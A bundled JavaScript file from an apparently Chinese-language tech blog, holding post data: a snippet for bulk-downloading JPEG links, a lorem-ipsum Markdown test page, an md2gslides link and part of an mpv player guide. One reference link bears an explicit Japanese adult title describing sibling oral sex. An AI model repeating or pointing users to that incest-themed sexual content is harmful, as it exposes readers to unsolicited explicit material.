class=\"token function\">call</span><span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelectorAll</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span>\n    <span class=\"token punctuation\">(</span><span class=\"token parameter\">img</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span>\n      img<span class=\"token punctuation\">.</span>href <span class=\"token operator\">&amp;&amp;</span>\n      img<span class=\"token punctuation\">.</span>href<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"jpeg\"</span><span class=\"token punctuation\">,</span> img<span class=\"token punctuation\">.</span>href<span class=\"token punctuation\">.</span>length <span class=\"token operator\">-</span> <span class=\"token string\">\"jpeg\"</span><span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span> <span class=\"token operator\">!==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span>\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>img <span class=\"token keyword\">of</span> images<span class=\"token punctuation\">)</span> img<span class=\"token punctuation\">.</span><span class=\"token function\">setAttributeNode</span><span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">.</span><span class=\"token function\">createAttribute</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"download\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://hamedoragon.fanbox.cc/posts/1197681\">いつも弟の部屋で口淫してくれるパシリの姉ちゃん(オリジナルサイズ差分 25 枚!!!)｜ハメドラゴン｜ pixivFANBOX</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://gist.github.com/sfrdmn/8834747\">Bookmarklet to download all images on a page</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://stackoverflow.com/questions/19830088/download-multiple-images-at-once-with-javascript\">google chrome extension - Download multiple images at once with Javascript - Stack Overflow</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.verslu.is/development/chrome-extension-vs-code/\">Creating a Chrome Extension with VS Code - Gerald Versluis</a></li>\n</ul>\n<h2 id=\"參考文章\">參考文章</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/%E9%BA%A5%E5%85%8B%E7%9A%84%E5%8D%8A%E8%B7%AF%E5%87%BA%E5%AE%B6%E7%AD%86%E8%A8%98/%E7%AD%86%E8%A8%98-%E5%BE%9E%E9%9B%B6%E9%96%8B%E5%A7%8B%E8%A3%BD%E4%BD%9C-chrome-%E5%A5%97%E4%BB%B6%E5%88%B0%E4%B8%8A%E6%9E%B6%E5%95%86%E5%BA%97-4971ed79ac77\">[筆記] 從零開始製作 Chrome 套件到上架商店</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/chris-chuang/%E5%88%9D%E6%8E%A2-chrome-extension-19688ab79ae0\">初探 Chrome Extension</a></li>\n</ul>\n","date":"2019-11-05T01:57:35.000Z","excerpt":"","printDate":"November 5, 2019","printReadingTime":"1 min read"};

var route_42 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod64
});

var Mod65 = {"title":"Markdown Test Page","slug":"markdown-test","html":"<p>This page is an adapted version of <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/fullpipe/markdown-test-page\">markdown-test-page</a>. It should give you an idea of how different elements are styled on this template.</p>\n<h2 id=\"a-nametopa-table-of-contents\"><a name=\"top\"></a> Table of Contents</h2>\n<ul>\n<li><a onclick=\"document.location.hash='Headings';\" href=\"javascript:;\">Headings</a></li>\n<li><a onclick=\"document.location.hash='Paragraphs';\" href=\"javascript:;\">Paragraphs</a></li>\n<li><a onclick=\"document.location.hash='Blockquotes';\" href=\"javascript:;\">Blockquotes</a></li>\n<li><a onclick=\"document.location.hash='Lists';\" href=\"javascript:;\">Lists</a></li>\n<li><a onclick=\"document.location.hash='Horizontal';\" href=\"javascript:;\">Horizontal rule</a></li>\n<li><a onclick=\"document.location.hash='Table';\" href=\"javascript:;\">Table</a></li>\n<li><a onclick=\"document.location.hash='Code';\" href=\"javascript:;\">Code</a></li>\n<li><a onclick=\"document.location.hash='Inline';\" href=\"javascript:;\">Inline elements</a></li>\n</ul>\n<hr>\n<h1 id=\"a-nameheadingsaheadings\"><a name=\"Headings\"></a>Headings</h1>\n<h1 id=\"heading-one\">Heading one</h1>\n<p>Sint sit cillum pariatur eiusmod nulla pariatur ipsum. Sit laborum anim qui mollit tempor pariatur nisi minim dolor. Aliquip et adipisicing sit sit fugiat commodo id sunt. Nostrud enim ad commodo incididunt cupidatat in ullamco ullamco Lorem cupidatat velit enim et Lorem. Ut laborum cillum laboris fugiat culpa sint irure do reprehenderit culpa occaecat. Exercitation esse mollit tempor magna aliqua in occaecat aliquip veniam reprehenderit nisi dolor in laboris dolore velit.</p>\n<h2 id=\"heading-two\">Heading two</h2>\n<p>Aute officia nulla deserunt do deserunt cillum velit magna. Officia veniam culpa anim minim dolore labore pariatur voluptate id ad est duis quis velit dolor pariatur enim. Incididunt enim excepteur do veniam consequat culpa do voluptate dolor fugiat ad adipisicing sit. Labore officia est adipisicing dolore proident eiusmod exercitation deserunt ullamco anim do occaecat velit. Elit dolor consectetur proident sunt aliquip est do tempor quis aliqua culpa aute. Duis in tempor exercitation pariatur et adipisicing mollit irure tempor ut enim esse commodo laboris proident. Do excepteur laborum anim esse aliquip eu sit id Lorem incididunt elit irure ea nulla dolor et. Nulla amet fugiat qui minim deserunt enim eu cupidatat aute officia do velit ea reprehenderit.</p>\n<h3 id=\"heading-three\">Heading three</h3>\n<p>Voluptate cupidatat cillum elit quis ipsum eu voluptate fugiat consectetur enim. Quis ut voluptate culpa ex anim aute consectetur dolore proident voluptate exercitation eiusmod. Esse in do anim magna minim culpa sint. Adipisicing ipsum consectetur proident ullamco magna sit amet aliqua aute fugiat laborum exercitation duis et.</p>\n<h4 id=\"heading-four\">Heading four</h4>\n<p>Commodo fugiat aliqua minim quis pariatur mollit id tempor. Non occaecat minim esse enim aliqua adipisicing nostrud duis consequat eu adipisicing qui. Minim aliquip sit excepteur ipsum consequat laborum pariatur excepteur. Veniam fugiat et amet ad elit anim laborum duis mollit occaecat et et ipsum et reprehenderit. Occaecat aliquip dolore adipisicing sint labore occaecat officia fugiat. Quis adipisicing exercitation exercitation eu amet est laboris sunt nostrud ipsum reprehenderit ullamco. Enim sint ut consectetur id anim aute voluptate exercitation mollit dolore magna magna est Lorem. Ut adipisicing adipisicing aliqua ullamco voluptate labore nisi tempor esse magna incididunt.</p>\n<h5 id=\"heading-five\">Heading five</h5>\n<p>Veniam enim esse amet veniam deserunt laboris amet enim consequat. Minim nostrud deserunt cillum consectetur commodo eu enim nostrud ullamco occaecat excepteur. Aliquip et ut est commodo enim dolor amet sint excepteur. Amet ad laboris laborum deserunt sint sunt aliqua commodo ex duis deserunt enim est ex labore ut. Duis incididunt velit adipisicing non incididunt adipisicing adipisicing. Ad irure duis nisi tempor eu dolor fugiat magna et consequat tempor eu ex dolore. Mollit esse nisi qui culpa ut nisi ex proident culpa cupidatat cillum culpa occaecat anim. Ut officia sit ea nisi ea excepteur nostrud ipsum et nulla.</p>\n<h6 id=\"heading-six\">Heading six</h6>\n<p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.</p>\n<p><a onclick=\"document.location.hash='top';\" href=\"javascript:;\">[Top]</a></p>\n<h1 id=\"a-nameparagraphsaparagraphs\"><a name=\"Paragraphs\"></a>Paragraphs</h1>\n<p>Incididunt ex adipisicing ea ullamco consectetur in voluptate proident fugiat tempor deserunt reprehenderit ullamco id dolore laborum. Do laboris laboris minim incididunt qui consectetur exercitation adipisicing dolore et magna consequat magna anim sunt. Officia fugiat Lorem sunt pariatur incididunt Lorem reprehenderit proident irure. Dolore ipsum aliqua mollit ad officia fugiat sit eu aliquip cupidatat ipsum duis laborum laborum fugiat esse. Voluptate anim ex dolore deserunt ea ex eiusmod irure. Occaecat excepteur aliqua exercitation aliquip dolor esse eu eu.</p>\n<p>Officia dolore laborum aute incididunt commodo nisi velit est est elit et dolore elit exercitation. Enim aliquip magna id ipsum aliquip consectetur ad nulla quis. Incididunt pariatur dolor consectetur cillum enim velit cupidatat laborum quis ex.</p>\n<p>Officia irure in non voluptate adipisicing sit amet tempor duis dolore deserunt enim ut. Reprehenderit incididunt in ad anim et deserunt deserunt Lorem laborum quis. Enim aute anim labore proident laboris voluptate elit excepteur in. Ex labore nulla velit officia ullamco Lorem Lorem id do. Dolore ullamco ipsum magna dolor pariatur voluptate ipsum id occaecat ipsum. Dolore tempor quis duis commodo quis quis enim.</p>\n<p><a onclick=\"document.location.hash='top';\" href=\"javascript:;\">[Top]</a></p>\n<h1 id=\"a-nameblockquotesablockquotes\"><a name=\"Blockquotes\"></a>Blockquotes</h1>\n<p>Ad nisi laborum aute cupidatat magna deserunt eu id laboris id. Aliquip nulla cupidatat sint ex Lorem mollit laborum dolor amet est ut esse aute. Nostrud ex consequat id incididunt proident ipsum minim duis aliqua ut ex et ad quis. Laborum sint esse cillum anim nulla cillum consectetur aliqua sit. Nisi excepteur cillum labore amet excepteur commodo enim occaecat consequat ipsum proident exercitation duis id in.</p>\n<blockquote>\n<p>Ipsum et cupidatat mollit exercitation enim duis sunt irure aliqua reprehenderit mollit. Pariatur Lorem pariatur laboris do culpa do elit irure. Eiusmod amet nulla voluptate velit culpa et aliqua ad reprehenderit sit ut.</p>\n</blockquote>\n<p>Labore ea magna Lorem consequat aliquip consectetur cillum duis dolore. Et veniam dolor qui incididunt minim amet laboris sit. Dolore ad esse commodo et dolore amet est velit ut nisi ea. Excepteur ea nulla commodo dolore anim dolore adipisicing eiusmod labore id enim esse quis mollit deserunt est. Minim ea culpa voluptate nostrud commodo proident in duis aliquip minim.</p>\n<blockquote>\n<p>Qui est sit et reprehenderit aute est esse enim aliqua id aliquip ea anim. Pariatur sint reprehenderit mollit velit voluptate enim consectetur sint enim. Quis exercitation proident elit non id qui culpa dolore esse aliquip consequat.</p>\n</blockquote>\n<p>Ipsum excepteur cupidatat sunt minim ad eiusmod tempor sit.</p>\n<blockquote>\n<p>Deserunt excepteur adipisicing culpa pariatur cillum laboris ullamco nisi fugiat cillum officia. In cupidatat nulla aliquip tempor ad Lorem Lorem quis voluptate officia consectetur pariatur ex in est duis. Mollit id esse est elit exercitation voluptate nostrud nisi laborum magna dolore dolore tempor in est consectetur.</p>\n</blockquote>\n<p>Adipisicing voluptate ipsum culpa voluptate id aute laboris labore esse fugiat veniam ullamco occaecat do ut. Tempor et esse reprehenderit veniam proident ipsum irure sit ullamco et labore ea excepteur nulla labore ut. Ex aute minim quis tempor in eu id id irure ea nostrud dolor esse.</p>\n<p><a onclick=\"document.location.hash='top';\" href=\"javascript:;\">[Top]</a></p>\n<h1 id=\"a-namelistsalists\"><a name=\"Lists\"></a>Lists</h1>\n<h3 id=\"ordered-list\">Ordered List</h3>\n<ol>\n<li>Longan</li>\n<li>Lychee</li>\n<li>Excepteur ad cupidatat do elit laborum amet cillum reprehenderit consequat quis.\nDeserunt officia esse aliquip consectetur duis ut labore laborum commodo aliquip aliquip velit pariatur dolore.</li>\n<li>Marionberry</li>\n<li>Melon<ul>\n<li>Cantaloupe</li>\n<li>Honeydew</li>\n<li>Watermelon</li>\n</ul>\n</li>\n<li>Miracle fruit</li>\n<li>Mulberry</li>\n</ol>\n<h3 id=\"unordered-list\">Unordered List</h3>\n<ul>\n<li>Olive</li>\n<li>Orange<ul>\n<li>Blood orange</li>\n<li>Clementine</li>\n</ul>\n</li>\n<li>Papaya</li>\n<li>Ut aute ipsum occaecat nisi culpa Lorem id occaecat cupidatat id id magna laboris ad duis. Fugiat cillum dolore veniam nostrud proident sint consectetur eiusmod irure adipisicing.</li>\n<li>Passionfruit</li>\n</ul>\n<p><a onclick=\"document.location.hash='top';\" href=\"javascript:;\">[Top]</a></p>\n<h1 id=\"a-namehorizontalahorizontal-rule\"><a name=\"Horizontal\"></a>Horizontal rule</h1>\n<p>In dolore velit aliquip labore mollit minim tempor veniam eu veniam ad in sint aliquip mollit mollit. Ex occaecat non deserunt elit laborum sunt tempor sint consequat culpa culpa qui sit. Irure ad commodo eu voluptate mollit cillum cupidatat veniam proident amet minim reprehenderit.</p>\n<hr>\n<p>In laboris eiusmod reprehenderit aliquip sit proident occaecat. Non sit labore anim elit veniam Lorem minim commodo eiusmod irure do minim nisi. Dolor amet cillum excepteur consequat sint non sint.</p>\n<p><a onclick=\"document.location.hash='top';\" href=\"javascript:;\">[Top]</a></p>\n<h1 id=\"a-nametableatable\"><a name=\"Table\"></a>Table</h1>\n<p>Duis sunt ut pariatur reprehenderit mollit mollit magna dolore in pariatur nulla commodo sit dolor ad fugiat. Laboris amet ea occaecat duis eu enim exercitation deserunt ea laborum occaecat reprehenderit. Et incididunt dolor commodo consequat mollit nisi proident non pariatur in et incididunt id. Eu ut et Lorem ea ex magna minim ipsum ipsum do.</p>\n<table>\n<thead>\n<tr>\n<th align=\"left\">Table Heading 1</th>\n<th align=\"left\">Table Heading 2</th>\n<th align=\"center\">Center align</th>\n<th align=\"right\">Right align</th>\n<th align=\"left\">Table Heading 5</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">Item 1</td>\n<td align=\"left\">Item 2</td>\n<td align=\"center\">Item 3</td>\n<td align=\"right\">Item 4</td>\n<td align=\"left\">Item 5</td>\n</tr>\n<tr>\n<td align=\"left\">Item 1</td>\n<td align=\"left\">Item 2</td>\n<td align=\"center\">Item 3</td>\n<td align=\"right\">Item 4</td>\n<td align=\"left\">Item 5</td>\n</tr>\n<tr>\n<td align=\"left\">Item 1</td>\n<td align=\"left\">Item 2</td>\n<td align=\"center\">Item 3</td>\n<td align=\"right\">Item 4</td>\n<td align=\"left\">Item 5</td>\n</tr>\n<tr>\n<td align=\"left\">Item 1</td>\n<td align=\"left\">Item 2</td>\n<td align=\"center\">Item 3</td>\n<td align=\"right\">Item 4</td>\n<td align=\"left\">Item 5</td>\n</tr>\n<tr>\n<td align=\"left\">Item 1</td>\n<td align=\"left\">Item 2</td>\n<td align=\"center\">Item 3</td>\n<td align=\"right\">Item 4</td>\n<td align=\"left\">Item 5</td>\n</tr>\n</tbody></table>\n<p>Minim id consequat adipisicing cupidatat laborum culpa veniam non consectetur et duis pariatur reprehenderit eu ex consectetur. Sunt nisi qui eiusmod ut cillum laborum Lorem officia aliquip laboris ullamco nostrud laboris non irure laboris. Cillum dolore labore Lorem deserunt mollit voluptate esse incididunt ex dolor.</p>\n<p><a onclick=\"document.location.hash='top';\" href=\"javascript:;\">[Top]</a></p>\n<h1 id=\"a-namecodeacode\"><a name=\"Code\"></a>Code</h1>\n<h2 id=\"inline-code\">Inline code</h2>\n<p>Ad amet irure est magna id mollit Lorem in do duis enim. Excepteur velit nisi magna ea pariatur pariatur ullamco fugiat deserunt sint non sint. Duis duis est <code>code in text</code> velit velit aute culpa ex quis pariatur pariatur laborum aute pariatur duis tempor sunt ad. Irure magna voluptate dolore consectetur consectetur irure esse. Anim magna <code>&lt;strong&gt;in culpa qui officia&lt;/strong&gt;</code> dolor eiusmod esse amet aute cupidatat aliqua do id voluptate cupidatat reprehenderit amet labore deserunt.</p>\n<h2 id=\"highlighted\">Highlighted</h2>\n<p>Et fugiat ad nisi amet magna labore do cillum fugiat occaecat cillum Lorem proident. In sint dolor ullamco ad do adipisicing amet id excepteur Lorem aliquip sit irure veniam laborum duis cillum. Aliqua occaecat minim cillum deserunt magna sunt laboris do do irure ea nostrud consequat ut voluptate ex.</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>md:flex<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>md:flex-shrink-0<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>img</span>\n      <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>rounded-lg md:w-56<span class=\"token punctuation\">\"</span></span>\n      <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>https://images.unsplash.com/photo-1556740738-b6a63e27c4df?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=448&amp;q=80<span class=\"token punctuation\">\"</span></span>\n      <span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Woman paying for a purchase<span class=\"token punctuation\">\"</span></span>\n    <span class=\"token punctuation\">/></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>mt-4 md:mt-0 md:ml-6<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>uppercase tracking-wide text-sm text-indigo-600 font-bold<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n      Marketing\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span>\n      <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#<span class=\"token punctuation\">\"</span></span>\n      <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>block mt-1 text-lg leading-tight font-semibold text-gray-900 hover:underline<span class=\"token punctuation\">\"</span></span>\n      <span class=\"token punctuation\">></span></span>Finding customers for your new business<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span>\n    <span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>mt-2 text-gray-600<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n      Getting a new business off the ground is a lot of hard work. Here are five\n      ideas you can use to find your first customers.\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><p>Ex amet id ex aliquip id do laborum excepteur exercitation elit sint commodo occaecat nostrud est. Nostrud pariatur esse veniam laborum non sint magna sit laboris minim in id. Aliqua pariatur pariatur excepteur adipisicing irure culpa consequat commodo et ex id ad.</p>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n  <span class=\"token keyword\">let</span> count <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">handleClick</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    count <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n  <span class=\"token punctuation\">}</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>button</span> <span class=\"token attr-name\"><span class=\"token namespace\">on:</span>click</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>{handleClick}<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  Clicked {count} {count === 1 ? 'time' : 'times'}\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>button</span><span class=\"token punctuation\">></span></span></code></pre><p><a onclick=\"document.location.hash='top';\" href=\"javascript:;\">[Top]</a></p>\n<h1 id=\"a-nameinlineainline-elements\"><a name=\"Inline\"></a>Inline elements</h1>\n<p>Sint ea anim ipsum ad commodo cupidatat do <strong>exercitation</strong> incididunt et minim ad labore sunt. Minim deserunt labore laboris velit nulla incididunt ipsum nulla. Ullamco ad laborum ea qui et anim in laboris exercitation tempor sit officia laborum reprehenderit culpa velit quis. <strong>Consequat commodo</strong> reprehenderit duis <a onclick=\"document.location.hash='';\" href=\"javascript:;\">irure</a> esse esse exercitation minim enim Lorem dolore duis irure. Nisi Lorem reprehenderit ea amet excepteur dolor excepteur magna labore proident voluptate ipsum. Reprehenderit ex esse deserunt aliqua ea officia mollit Lorem nulla magna enim. Et ad ipsum labore enim ipsum <strong>cupidatat consequat</strong>. Commodo non ea cupidatat magna deserunt dolore ipsum velit nulla elit veniam nulla eiusmod proident officia.</p>\n<p><img src=\"https://placekitten.com/1280/800\" alt=\"Super wide\"></p>\n<p><em>Proident sit veniam in est proident officia adipisicing</em> ea tempor cillum non cillum velit deserunt. Voluptate laborum incididunt sit consectetur Lorem irure incididunt voluptate nostrud. Commodo ut eiusmod tempor cupidatat esse enim minim ex anim consequat. Mollit sint culpa qui laboris quis consectetur ad sint esse. Amet anim anim minim ullamco et duis non irure. Sit tempor adipisicing ea laboris <code>culpa ex duis sint</code> anim aute reprehenderit id eu ea. Aute <a onclick=\"document.location.hash='';\" href=\"javascript:;\">excepteur proident</a> Lorem minim adipisicing nostrud mollit ad ut voluptate do nulla esse occaecat aliqua sint anim.</p>\n<p><img src=\"https://placekitten.com/480/400\" alt=\"Not so big\"></p>\n<p>Incididunt in culpa cupidatat mollit cillum qui proident sit. In cillum aliquip incididunt voluptate magna amet cupidatat cillum pariatur sint aliqua est <em>enim <strong>anim</strong> voluptate</em>. Magna aliquip proident incididunt id duis pariatur eiusmod incididunt commodo culpa dolore sit. Culpa do nostrud elit ad exercitation anim pariatur non minim nisi <strong>adipisicing sunt <em>officia</em></strong>. Do deserunt magna mollit Lorem commodo ipsum do cupidatat mollit enim ut elit veniam ea voluptate.</p>\n<iframe width=\"100%\" height=\"400\" src=\"https://www.youtube.com/embed/PCp2iXA1uLE\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n\n<p>Reprehenderit non eu quis in ad elit esse qui aute id <a onclick=\"document.location.hash='';\" href=\"javascript:;\">incididunt</a> dolore cillum. Esse laboris consequat dolor anim exercitation tempor aliqua deserunt velit magna laboris. Culpa culpa minim duis amet mollit do quis amet commodo nulla irure.</p>\n","date":"2019-06-16T12:51:00.000Z","excerpt":"\nA sample page with the most common elements of an article, including headings, paragraphs, lists, and images.\nUse it as a starting point for applying your own styles.\n\n","printDate":"June 16, 2019","printReadingTime":"11 min read"};

var route_58 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod65
});

var Mod66 = {"title":"Markdown to Google Slides","slug":"md2gslides","html":"<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.npmjs.com/package/md2gslides\">md2gslides - npm</a></li>\n</ul>\n","date":"2020-10-17T05:36:09.000Z","excerpt":"","printDate":"October 17, 2020","printReadingTime":"1 min read"};

var route_69 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod66
});

var Mod67 = {"title":"免安裝單一程式看遍所有影片！簡潔強大的播放器 mpv","slug":"mpv","html":"<h2 id=\"介紹\">介紹</h2>\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://mpv.io/\">mpv</a> 是一套免費開源跨平台的播放器，承繼 mplayer2 與 MPlayer 兩套軟體開發而來，免安裝的特性對於不想在電腦裡安裝太多東西的使用者來說相當方便，只要直接開啟就能播放影片，然而沒有工具列與功能列表，機制全都需要透過鍵盤操作的特徵，也因此勸退了許多入坑的使用者。</p>\n<h2 id=\"常用操作\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://mpv.io/manual/master/#keyboard-control\">常用操作</a></h2>\n<p>mpv 的快捷鍵可以開啟 <code>~/.config/mpv/input.conf</code> 進行修改，並且在 <code>~/.config/mpv/doc</code> 內有提供範例檔案，起先在 <code>mpv</code> 資料夾內沒有此設定檔案，需自行建立檔案，或直接從 <code>doc</code> 資料夾內複製範例檔案到 <code>mpv</code> 資料夾進行修改。</p>\n<p>自訂輸入格式請參照 <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/mpv-player/mpv/blob/master/DOCS/man/input.rst#inputconf-syntax\">官方文件</a>。</p>\n<p>檔案內以 <code>#</code> 符號開頭的內文都是註解。如果想修改 <code>#</code> 鍵的功能需改用 <code>SHAPE</code> 當成綁定目標。</p>\n<h3 id=\"播放\">播放</h3>\n<ul>\n<li><code>←</code> / <code>→</code>: 倒/快轉 5 秒。</li>\n<li><code>↑</code> / <code>↓</code>: 倒/快轉 1 分鐘。</li>\n<li><code>&lt;</code> / <code>&gt;</code>: 切換至播放清單裡的前/下一支影片。</li>\n<li><code>p</code> &amp; <code>空白鍵</code> &amp; <code>右鍵</code>: 暫停。</li>\n<li><code>f</code>: 進入全螢幕模式。</li>\n<li><code>ESC</code>: 離開全螢幕模式。</li>\n<li><code>O</code>: 顯示播放資訊</li>\n<li><code>Alt</code> + <code>0</code> / <code>1</code> / <code>2</code>: 調整影片顯 示大小。</li>\n</ul>\n<h4 id=\"調整畫面\">調整畫面</h4>\n<ul>\n<li><code>1</code> / <code>2</code>: 調整對比。</li>\n<li><code>3</code> / <code>4</code>: 調整明亮。</li>\n<li><code>5</code> / <code>6</code>: 調整伽瑪值。</li>\n<li><code>7</code> / <code>8</code>: 調整飽和度。</li>\n</ul>\n<h3 id=\"字幕\">字幕</h3>\n<ul>\n<li><code>Ctrl</code> + <code>←</code> / <code>→</code>: 切換字幕。</li>\n<li><code>Ctrl</code> + <code>Shift</code> + <code>←</code> / <code>→</code>: 調整字幕延遲。</li>\n<li><code>z</code> / <code>Z</code> &amp; <code>x</code>: 調慢/快字幕 0.1 秒。</li>\n<li><code>r</code> / <code>R</code> &amp; <code>t</code>: 調高/低字幕位置。</li>\n</ul>\n<h3 id=\"音量\">音量</h3>\n<ul>\n<li><code>/</code> &amp; <code>9</code> / <code>*</code> &amp; <code>0</code>: 降低/提高音量。</li>\n<li><code>m</code>: 靜音。</li>\n<li><code>-</code> / <code>#</code>: 切換音軌。</li>\n<li><code>Ctrl</code> + <code>+</code> / <code>-</code>: 調慢/快聲音延遲 0.1 秒。</li>\n</ul>\n<h2 id=\"播放器設定\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/mpv-player/mpv/blob/master/DOCS/man/mpv.rst#configuration-files\">播放器設定</a></h2>\n<p>mpv 的設定可以透過修改 <code>~/.config/mpv/mpv.conf</code> 進行變更，同樣在 <code>~/.config/mpv/doc</code> 內有提供範例檔案，可以設定如是否使用 GPU 加速、影像縮放時使用的演算法，來增加畫面的銳利度、整體音量大小與變化程度的平衡、播放完畢後是否關閉播放器、讀取 youtube 影片時預設使用的解析度。</p>\n<h3 id=\"影像處理\"><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/mpv-player/mpv/blob/master/DOCS/man/vo.rst\">影像處理</a></h3>\n<ul>\n<li>High Preset：<code>vo=opengl-hq:scale=ewa_lanczossharp:cscale=ewa_lanczossofthwdec=auto</code></li>\n<li>Highest Preset：<code>vo=opengl-hq:scale=ewa_lanczossharp:cscale=ewa_lanczossoft:prescale-luma=superxbr:prescale-downscaling-threshold=1.5</code></li>\n<li>Insame Preset：<code>vo=opengl-hq:scale=ewa_lanczossharp:cscale=ewa_lanczossoft:prescale-luma=nnedi3:prescale-downscaling-threshold=1.5</code></li>\n<li>影音顯示同步：<code>video-sync=display-resample</code></li>\n</ul>\n<h3 